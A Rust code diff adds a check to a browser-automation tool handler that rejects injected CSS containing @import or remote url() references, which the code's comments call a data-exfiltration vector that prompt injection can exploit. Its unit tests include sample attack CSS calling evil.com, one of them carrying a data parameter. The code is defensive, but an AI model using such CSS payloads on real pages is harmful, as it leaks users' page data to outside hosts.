@@ -4,6 +4,69 @@ use std::sync::atomic::{AtomicU64, Ordering};
 use crate::bridge_dispatch::BridgeDispatch;
 use crate::tab_state::TabManager;
 
+/// Strip CSS `/* ... */` comments so a remote-ref scan cannot be evaded by hiding
+/// `@import`/`url(` inside a comment the browser's CSS parser ignores.
+fn strip_css_comments(css: &str) -> String {
+    let bytes = css.as_bytes();
+    let mut out = String::with_capacity(css.len());
+    let mut i = 0;
+    while i < bytes.len() {
+        if i + 1 < bytes.len() && bytes[i] == b'/' && bytes[i + 1] == b'*' {
+            i += 2;
+            while i + 1 < bytes.len() && !(bytes[i] == b'*' && bytes[i + 1] == b'/') {
+                i += 1;
+            }
+            i = (i + 2).min(bytes.len());
+        } else {
+            out.push(bytes[i] as char);
+            i += 1;
+        }
+    }
+    out
+}
+
+/// Reject injected CSS that fetches a remote origin (`@import` or remote `url(...)`),
+/// unless `allow_remote` is set. The browser extension runs against arbitrary, possibly
+/// hostile websites, so a remote-fetching injection is a data-exfiltration / `SSRF` vector
+/// (especially when chained with page-sourced prompt injection). Relative refs, `data:`
+/// URIs, and `#fragment` refs are allowed.
+fn check_injected_css(css: &str, allow_remote: bool) -> Result<(), String> {
+    const MAX_CSS_LEN: usize = 256 * 1024;
+    if css.len() > MAX_CSS_LEN {
+        return Err(format!(
+            "injected CSS too large ({} bytes, limit {MAX_CSS_LEN})",
+            css.len()
+        ));
+    }
+    if allow_remote {
+        return Ok(());
+    }
+    let scan = strip_css_comments(css).to_ascii_lowercase();
+    if scan.contains("@import") {
+        return Err(
+            "`@import` is blocked in injected CSS (it fetches a remote stylesheet — a \
+                    data-exfiltration vector). Inline the rules, or pass `allow_remote: true`."
+                .to_string(),
+        );
+    }
+    let mut from = 0;
+    while let Some(rel) = scan[from..].find("url(") {
+        let start = from + rel + 4;
+        let end = scan[start..].find(')').map_or(scan.len(), |e| start + e);
+        let arg = scan[start..end].trim().trim_matches(['\'', '"']).trim();
+        if arg.starts_with("//") || arg.contains("://") {
+            return Err(
+                "remote `url(...)` is blocked in injected CSS (it would fetch a remote origin — \
+                 a data-exfiltration vector). Use a relative or data: URL, or pass \
+                 `allow_remote: true`."
+                    .to_string(),
+            );
+        }
+        from = end;
+    }
+    Ok(())
+}
+
 #[derive(Clone)]
 pub struct VictauriBrowserHandler {
     tab_manager: Arc<TabManager>,
@@ -327,6 +390,11 @@ impl VictauriBrowserHandler {
                             .get("css")
                             .and_then(serde_json::Value::as_str)
                             .ok_or("missing 'css'")?;
+                        let allow_remote = args
+                            .get("allow_remote")
+                            .and_then(serde_json::Value::as_bool)
+                            .unwrap_or(false);
+                        check_injected_css(css, allow_remote)?;
                         self.dispatch
                             .dispatch(tab_id, "injectCss", serde_json::json!({"css": css}))
                             .await
@@ -658,6 +726,25 @@ mod tests {
     fn tool_list_has_20_tools() {
         let handler = make_handler();
         assert_eq!(handler.list_tools().len(), 20);
+    }
+
+    #[test]
+    fn injected_css_blocks_remote_refs() {
+        assert!(check_injected_css("@import url(https://evil.com/x.css);", false).is_err());
+        assert!(check_injected_css("/* c */@import 'https://evil.com';", false).is_err());
+        assert!(check_injected_css("body{background:url(https://evil.com/x?d=1)}", false).is_err());
+        assert!(check_injected_css("a{cursor:url(//evil.com/c)}", false).is_err());
+    }
+
+    #[test]
+    fn injected_css_allows_local_and_opt_in() {
+        assert!(check_injected_css("body{color:red}", false).is_ok());
+        assert!(check_injected_css("body{background:url('/a.png')}", false).is_ok());
+        assert!(
+            check_injected_css("body{background:url(data:image/png;base64,AA)}", false).is_ok()
+        );
+        // Opt-in re-enables remote refs.
+        assert!(check_injected_css("@import url(https://cdn.example/x.css);", true).is_ok());
     }
 
     #[tokio::test]
